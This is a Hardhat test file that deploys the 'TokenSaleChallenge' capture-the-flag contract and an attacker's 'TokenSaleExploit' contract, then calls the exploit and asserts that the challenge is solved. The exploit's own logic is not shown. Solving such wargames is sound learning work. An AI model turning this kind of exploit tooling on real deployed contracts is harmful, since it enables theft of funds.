import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils } = ethers;

describe('TokenSaleChallenge', () => {
  let target: Contract;
  let attackContract: Contract; 
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('TokenSaleChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1')
    });

    await target.deployed();

    target = target.connect(attacker);

    const attackTx = await ethers.getContractFactory('TokenSaleExploit', deployer); 
    attackContract = await attackTx.deploy(target.address, {value: utils.parseEther('10')}); 
    await attackContract.deployed(); 
    attackContract = attackContract.connect(attacker);


  });

  it('exploit', async () => { 

    const [numTokens, value] = await attackContract.valueToAttack(); 
    console.log("Value of TokenNums: ", numTokens);
    console.log("Value of Value: ", value);
    console.log("IsComplete: ", await target.isComplete());

    await attackContract.attack(); 

    expect(await target.isComplete()).to.equal(true);
  });
});
